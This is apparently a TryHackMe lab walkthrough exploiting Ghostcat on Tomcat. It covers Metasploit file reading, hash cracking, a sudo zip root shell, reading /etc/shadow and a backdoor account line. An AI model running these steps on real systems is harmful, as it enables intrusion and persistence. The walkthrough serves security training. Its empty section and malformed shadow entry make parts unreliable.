# TryHackMe - Ghostcat Exploitation Walkthrough

## **1. Initial Enumeration with Nmap**
We begin by scanning the target with **Nmap** to identify open ports and running services:

```bash
nmap -sC -sV -p- 10.10.170.30
```

### **Nmap Results:**
```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
8080/tcp open  http       Apache Tomcat 9.0.30
```

From the scan results, we identify an **Apache JServ Protocol (AJP) service** running on port **8009**, which is vulnerable to **Ghostcat** (CVE-2020-1938).

---
## **2. Searching for Exploits**
Using `searchsploit`, we confirm that **Ghostcat** is a known vulnerability:

```bash
searchsploit Apache Jserv v1.3
```

This confirms the vulnerability **Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion** (CVE-2020-1938).

### **Exploit-DB Reference:**  
- [https://www.exploit-db.com/exploits/48143](https://www.exploit-db.com/exploits/48143)

Since the **Exploit-DB version is outdated**, we use **Metasploit**.

---
## **3. Exploiting Ghostcat via Metasploit**

### **Setting up the Module**
Launch **Metasploit**:
```bash
msfconsole
```

Load the Ghostcat module:
```bash
use auxiliary/admin/http/tomcat_ghostcat
```

Set the target IP and port:
```bash
set RHOST 10.10.170.30
set RPORT 8009
set FILENAME /WEB-INF/web.xml
```

Execute the exploit:
```bash
exploit
```

### **Extracted Credentials from web.xml:**
```
skyfuck:8730281lkjlkjdqlksalks
```

Now, we have credentials for a possible user account.

---
## **4. Checking for Scheduled Cron Jobs**
After gaining access to the system, check for scheduled cron jobs:


## **5. Extracting SSH Private Key**
Looking at `/home/skyfuck/`, we find a **PGP encrypted key**:

```bash
/home/skyfuck/tryhackme.asc
```

We transfer it to our machine using `scp`:
```bash
scp skyfuck@10.10.170.30:/home/skyfuck/tryhackme.asc .
```

Convert the key to a crackable format using **gpg2john**:
```bash
gpg2john tryhackme.asc > hash.txt
```

Use **Hashcat** to crack it:
```bash
hashcat -m 22600 hash.txt /usr/share/wordlists/rockyou.txt --force
```

After cracking, import the key:
```bash
gpg --import tryhackme.asc
```

Decrypt the `credentials.pgp` file:
```bash
gpg --decrypt credentials.pgp
```

Extracted password:
```
asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123jS
```

---
## **6. Switching to User merlin**
Now, we switch to **merlin** using the found credentials:
```bash
su merlin
```

---
## **7. Privilege Escalation via Zip Exploit**
User **merlin** has **sudo** privileges for `/usr/bin/zip`:

```
User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

We can abuse **zip's -T option** to escalate to root:

```bash
sudo zip /tmp/root.zip /etc/passwd -T --unzip-command="sh -c 'exec /bin/bash -p'"
```

### **Explanation:**
- `sudo zip /tmp/root.zip /etc/passwd` → Creates a zip archive.
- `-T` → Tests the archive's integrity.
- `--unzip-command` → Executes a shell command instead of extracting.
- `exec /bin/bash -p` → Spawns a **privileged root shell**.

---
## **8. Confirm Root Access**
Once inside the root shell, verify privileges:
```bash
whoami
id
```

We now have **root access** on the machine!

---
## **9. Post-Exploitation Steps**
- **Retrieve Flags:**
  ```bash
  cat /root/root.txt
  cat /home/skyfuck/user.txt
  ```
- **Check for additional credentials:**
  ```bash
  cat /etc/shadow
  ```
- **Maintain access (if needed):**
  ```bash
  echo 'hacker:$6$randomsalt$hashhere:0:0:root:/root:/bin/bash' >> /etc/shadow
  ```

---
## **10. Conclusion**
- **Enumeration with Nmap** revealed Apache JServ (AJP) service.
- **Ghostcat exploit** allowed us to extract user credentials.
- **SSH private key cracking** helped us switch to `merlin`.
- **Exploiting Sudo permissions on zip** provided **root access**.

**Rooted the box successfully! 🎉**

